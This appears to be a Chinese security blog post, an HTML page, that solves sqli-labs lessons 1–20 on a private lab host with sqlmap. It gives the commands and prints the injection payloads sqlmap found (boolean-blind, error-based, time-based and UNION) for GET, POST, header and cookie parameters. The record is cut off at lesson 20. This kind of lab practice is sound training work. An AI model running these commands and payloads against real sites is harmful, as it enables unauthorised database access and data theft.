@@ -1,0 +1,1156 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="make changes, make perfect">
+  <meta name="author" content="Dr34d">
+  <meta name="keywords" content="blog">
+  <title>sqlmap 解决sqli-labs - Dr34d&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/xt256.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"greydr34d.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Dr34d's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Dr34d's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/sql_injection_banner.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="sqlmap 解决sqli-labs">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-09-10 16:04" pubdate>
+        2020年9月10日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      101
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sqlmap 解决sqli-labs</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：9 天前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="Sqlmap、脚本解决sqli-labs"><a href="#Sqlmap、脚本解决sqli-labs" class="headerlink" title="Sqlmap、脚本解决sqli-labs"></a>Sqlmap、脚本解决sqli-labs</h1><h1 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-1/index.php?id=1 --batch --dbs</code></pre></div>
+
+
+
+<h1 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-2/index.php?id=1 --batch --dbs</code></pre></div>
+
+
+
+<h1 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-3/index.php?id=1 --batch --dbs</code></pre></div>
+
+
+
+<h1 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div>
+
+
+
+<h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div>
+
+<p>利用：报错注入，时间盲注</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">GET parameter <span class="hljs-string">&#x27;id&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 223 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1<span class="hljs-string">&#x27; AND 9191=9191 AND &#x27;</span>tjNq<span class="hljs-string">&#x27;=&#x27;</span>tjNq
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 5307 FROM(SELECT COUNT(*),CONCAT(0x716a787871,(SELECT (ELT(5307=5307,1))),0x7176767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;</span>lDyx<span class="hljs-string">&#x27;=&#x27;</span>lDyx
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 7383 FROM (SELECT(SLEEP(5)))QnIP) AND &#x27;</span>rsQQ<span class="hljs-string">&#x27;=&#x27;</span>rsQQ
+</code></pre></div>
+
+
+
+<h1 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div>
+
+<p>利用：二分注入、报错注入，时间盲注</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">GET parameter <span class="hljs-string">&#x27;id&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 207 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=1<span class="hljs-string">&quot; AND 5041=5041#</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Type: error-based</span>
+<span class="hljs-string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span>
+<span class="hljs-string">    Payload: id=1&quot;</span> AND (SELECT 3226 FROM(SELECT COUNT(*),CONCAT(0x716b706271,(SELECT (ELT(3226=3226,1))),0x717a6b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zVCx
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1<span class="hljs-string">&quot; AND (SELECT 5756 FROM (SELECT(SLEEP(5)))oBoe)-- dZNC</span>
+<span class="hljs-string">---</span>
+<span class="hljs-string"></span></code></pre></div>
+
+
+
+
+
+
+
+<h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div>
+
+<p>利用：二分注入，时间盲注</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 278 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1<span class="hljs-string">&#x27;) AND 9250=9250 AND (&#x27;</span>AWTH<span class="hljs-string">&#x27;=&#x27;</span>AWTH
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1<span class="hljs-string">&#x27;) AND (SELECT 4903 FROM (SELECT(SLEEP(5)))eIgu) AND (&#x27;</span>VQKm<span class="hljs-string">&#x27;=&#x27;</span>VQKm
+---
+</code></pre></div>
+
+
+
+<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div>
+
+<p>利用：二分注入，时间盲注</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1<span class="hljs-string">&#x27; AND 3254=3254 AND &#x27;</span>Eznz<span class="hljs-string">&#x27;=&#x27;</span>Eznz
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 2673 FROM (SELECT(SLEEP(5)))noGG) AND &#x27;</span>TnYF<span class="hljs-string">&#x27;=&#x27;</span>TnYF
+---
+</code></pre></div>
+
+
+
+
+
+<h1 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div>
+
+<p>利用：二分注入，时间盲注</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 243 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1<span class="hljs-string">&#x27; AND 6338=6338 AND &#x27;</span>zGGA<span class="hljs-string">&#x27;=&#x27;</span>zGGA
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 7400 FROM (SELECT(SLEEP(5)))lmWZ) AND &#x27;</span>pdvI<span class="hljs-string">&#x27;=&#x27;</span>pdvI
+---
+</code></pre></div>
+
+
+
+<h1 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h1><p>从10开始之前的payload不奏效了。</p>
+<p>从天书里看出只是换成了双引号，其实很简单，所以这里用到之前学到的prefix的方法</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-10/index.php?id=1 -p id --prefix <span class="hljs-string">&quot;\&quot;&quot;</span>  --batch --dbs</code></pre></div>
+
+<p>二分注入、时间注入</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 798 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1<span class="hljs-string">&quot; AND 4154=4154-- CDvk</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Type: time-based blind</span>
+<span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span>
+<span class="hljs-string">    Payload: id=1&quot;</span> AND (SELECT 9271 FROM (SELECT(SLEEP(5)))fjSc)-- pRRC
+---
+</code></pre></div>
+
+
+
+<h1 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h1><p>11是post注入</p>
+<p>很简单，自动提交表单即可</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-11/index.php --forms --dbs</code></pre></div>
+
+
+
+<p>二分注入、报错注入、时间盲注、union注入</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 125 HTTP(s) requests:
+---
+Parameter: uname (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: uname=HHNh<span class="hljs-string">&#x27; OR NOT 8084=8084#&amp;passwd=&amp;submit=Submit</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Type: error-based</span>
+<span class="hljs-string">    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span>
+<span class="hljs-string">    Payload: uname=HHNh&#x27;</span> OR (SELECT 1351 FROM(SELECT COUNT(*),CONCAT(0x7176717171,(SELECT (ELT(1351=1351,1))),0x7170716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zuew&amp;passwd=&amp;submit=Submit
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=HHNh<span class="hljs-string">&#x27; AND (SELECT 8246 FROM (SELECT(SLEEP(5)))ctEF)-- Ezsb&amp;passwd=&amp;submit=Submit</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Type: UNION query</span>
+<span class="hljs-string">    Title: MySQL UNION query (NULL) - 2 columns</span>
+<span class="hljs-string">    Payload: uname=HHNh&#x27;</span> UNION ALL SELECT CONCAT(0x7176717171,0x79456e586f4161764e7250446e485a67586e4a544e79484c756d6a4544536a717a5449576954656d,0x7170716b71),NULL<span class="hljs-comment">#&amp;passwd=&amp;submit=Submit</span>
+---
+</code></pre></div>
+
+
+
+<h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>与less1相同的payload</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-12/index.php --forms --dbs</code></pre></div>
+
+<p>报错、bool、时间、union都可以</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 134 HTTP(s) requests:
+---
+Parameter: uname (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: uname=hfRw<span class="hljs-string">&quot;) OR NOT 1620=1620#&amp;passwd=&amp;submit=Submit</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Type: error-based</span>
+<span class="hljs-string">    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span>
+<span class="hljs-string">    Payload: uname=hfRw&quot;</span>) AND EXTRACTVALUE(1777,CONCAT(0x5c,0x7178717171,(SELECT (ELT(1777=1777,1))),0x7171787a71)) AND (<span class="hljs-string">&quot;FDGb&quot;</span>=<span class="hljs-string">&quot;FDGb&amp;passwd=&amp;submit=Submit</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Type: time-based blind</span>
+<span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span>
+<span class="hljs-string">    Payload: uname=hfRw&quot;</span>) AND (SELECT 6736 FROM (SELECT(SLEEP(5)))stfK) AND (<span class="hljs-string">&quot;rnrd&quot;</span>=<span class="hljs-string">&quot;rnrd&amp;passwd=&amp;submit=Submit</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Type: UNION query</span>
+<span class="hljs-string">    Title: MySQL UNION query (NULL) - 2 columns</span>
+<span class="hljs-string">    Payload: uname=hfRw&quot;</span>) UNION ALL SELECT CONCAT(0x7178717171,0x655955517a486b7555414f47504a745979774842526d654a524a78516348664142695048464e6665,0x7171787a71),NULL<span class="hljs-comment">#&amp;passwd=&amp;submit=Submit</span>
+---
+</code></pre></div>
+
+
+
+
+
+
+
+<h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>payload不变：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-13/index.php --forms --dbs --batch</code></pre></div>
+
+<p>但是速度有点慢，可以参考之前的优化设置，也可以直接指定使用的注入方法–thread 10 –batch</p>
+<p>可以看出是加上了 ‘)</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 1226 HTTP(s) requests:
+---
+Parameter: uname (POST)
+    Type: error-based
+    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uname=nosa<span class="hljs-string">&#x27;) OR (SELECT 9280 FROM(SELECT COUNT(*),CONCAT(0x717a6b7071,(SELECT (ELT(9280=9280,1))),0x71706a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jgQP&amp;passwd=&amp;submit=Submit</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Type: time-based blind</span>
+<span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span>
+<span class="hljs-string">    Payload: uname=nosa&#x27;</span>) AND (SELECT 9185 FROM (SELECT(SLEEP(5)))QrLC)-- twvv&amp;passwd=&amp;submit=Submit
+---
+</code></pre></div>
+
+
+
+
+
+<h1 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-14/index.php --forms --dbs --thread 10 --batch</code></pre></div>
+
+
+
+<p>双引号</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 1225 HTTP(s) requests:
+---
+Parameter: uname (POST)
+    Type: error-based
+    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uname=gVWd<span class="hljs-string">&quot; OR (SELECT 7011 FROM(SELECT COUNT(*),CONCAT(0x717a6a6b71,(SELECT (ELT(7011=7011,1))),0x71706b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EcVM&amp;passwd=&amp;submit=Submit</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Type: time-based blind</span>
+<span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span>
+<span class="hljs-string">    Payload: uname=gVWd&quot;</span> AND (SELECT 2546 FROM (SELECT(SLEEP(5)))meQb)-- cASj&amp;passwd=&amp;submit=Submit
+---
+</code></pre></div>
+
+
+
+
+
+<h1 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-15/index.php --forms --dbs --thread 10 --batch</code></pre></div>
+
+<p>只能时间盲注，稍慢一点</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 91 HTTP(s) requests:
+---
+Parameter: uname (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=gtNL<span class="hljs-string">&#x27; AND (SELECT 4937 FROM (SELECT(SLEEP(5)))rzUm) AND &#x27;</span>KyvN<span class="hljs-string">&#x27;=&#x27;</span>KyvN&amp;passwd=&amp;submit=Submit
+---
+</code></pre></div>
+
+
+
+
+
+<h1 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h1><p>出现了无法注入的情况。看天书说是”)</p>
+<p>所以添加前缀</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-16/index.php --forms --dbs --thread 10 --prefix <span class="hljs-string">&quot;\&quot;)&quot;</span>  --batch</code></pre></div>
+
+
+
+<div class="hljs code-wrapper"><pre><code class="hljs sh">---
+Parameter: uname (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=JQyQ<span class="hljs-string">&quot;) AND (SELECT 3582 FROM (SELECT(SLEEP(5)))vtUP)-- bCkY&amp;passwd=&amp;submit=Submit</span>
+<span class="hljs-string">---</span>
+<span class="hljs-string"></span></code></pre></div>
+
+
+
+
+
+<h1 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h1><p>第17关对uname参数有checkinput保护，如果不想绕过uname的话，注入点其实在passwd。</p>
+<p>但是由于uname是一个确定的用户才能更新数据，所以这里不能自动填写表单了</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-17/index.php --data <span class="hljs-string">&quot;uname=admin&amp;passwd=&amp;submit=Submit&quot;</span> --dbs --thread 10  --prefix <span class="hljs-string">&quot;&#x27;&quot;</span> -p passwd --batch</code></pre></div>
+
+<p>报错注入、时间注入</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 1880 HTTP(s) requests:
+---
+Parameter: passwd (POST)
+    Type: error-based
+    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uname=admin&amp;passwd=<span class="hljs-string">&#x27; OR (SELECT 4589 FROM(SELECT COUNT(*),CONCAT(0x7178706b71,(SELECT (ELT(4589=4589,1))),0x717a627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- hurJ&amp;submit=Submit</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Type: time-based blind</span>
+<span class="hljs-string">    Title: MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)</span>
+<span class="hljs-string">    Payload: uname=admin&amp;passwd=&#x27;</span> OR (SELECT 8521 FROM (SELECT(SLEEP(5)))AJtH)-- HnnG&amp;submit=Submit
+---
+</code></pre></div>
+
+
+
+<p>如果绕过转义，这里主要是绕过mysql_real_escape_string后再次加上单引号的限制， 暂时不知道如何进行绕过</p>
+<h1 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h1><p>这一关是user-agent注入</p>
+<blockquote>
+<p>sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。</p>
+</blockquote>
+<p>例如： -p “id,user-agent”</p>
+<p>想要执行到注入点需要提供正确的uname和passwd</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-18/index.php --data <span class="hljs-string">&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;</span> --dbs --thread 10  -p <span class="hljs-string">&quot;user-agent&quot;</span>  --batch</code></pre></div>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200517191226342.png" alt="image-20200517191226342"></p>
+<p>sqlmap发包默认如图，可以使用random-agent参数或者直接–user-agent参数指定。</p>
+<p>可以使用报错注入和时间盲注。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 1582 HTTP(s) requests:
+---
+Parameter: User-Agent (User-Agent)
+    Type: error-based
+    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: sqlmap/1.4<span class="hljs-comment">#stable (http://sqlmap.org)&#x27; AND EXTRACTVALUE(8499,CONCAT(0x5c,0x71626a7171,(SELECT (ELT(8499=8499,1))),0x7170717871)) AND &#x27;anbC&#x27;=&#x27;anbC</span>
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 RLIKE time-based blind
+    Payload: sqlmap/1.4<span class="hljs-comment">#stable (http://sqlmap.org)&#x27; RLIKE SLEEP(5) AND &#x27;bpJy&#x27;=&#x27;bpJy</span>
+---
+</code></pre></div>
+
+
+
+<h1 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h1><p>与18关类似，这一关是考察referer字段</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-19/index.php --data <span class="hljs-string">&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;</span> --dbs --thread 10  -p <span class="hljs-string">&quot;referer&quot;</span>  --batch</code></pre></div>
+
+
+
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 413 HTTP(s) requests:
+---
+Parameter: Referer (Referer)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: http://192.168.133.162:80/sql/Less-19/index.php<span class="hljs-string">&#x27; RLIKE (SELECT (CASE WHEN (1980=1980) THEN 0x687474703a2f2f3139322e3136382e3133332e3136323a38302f73716c2f4c6573732d31392f696e6465782e706870 ELSE 0x28 END)) AND &#x27;</span>ARWO<span class="hljs-string">&#x27;=&#x27;</span>ARWO
+
+    Type: error-based
+    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: http://192.168.133.162:80/sql/Less-19/index.php<span class="hljs-string">&#x27; AND EXTRACTVALUE(8119,CONCAT(0x5c,0x71766b6b71,(SELECT (ELT(8119=8119,1))),0x7162707671)) AND &#x27;</span>nKgQ<span class="hljs-string">&#x27;=&#x27;</span>nKgQ
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 RLIKE time-based blind
+    Payload: http://192.168.133.162:80/sql/Less-19/index.php<span class="hljs-string">&#x27; RLIKE SLEEP(5) AND &#x27;</span>FSNZ<span class="hljs-string">&#x27;=&#x27;</span>FSNZ
+---
+</code></pre></div>
+
+
+
+
+
+<h1 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h1><p>我们需要在cookie中带上uname字段。并且不需要有submit字段，测试cookie只需要level2即可</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-20/index.php --cookie=<span class="hljs-string">&quot;uname=admin&quot;</span> --dbs --thread 10 --level 2  --batch</code></pre></div>
+
+
+
+<div class="hljs code-wrapper"><pre><code class="hljs sh">Cookie parameter <span class="hljs-string">&#x27;uname&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
+---
+Parameter: uname (Cookie)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: uname=admin<span class="hljs-string">&#x27; AND 6687=6687 AND &#x27;</span>KySP<span class="hljs-string">&#x27;=&#x27;</span>KySP
+
+    Type: error-based
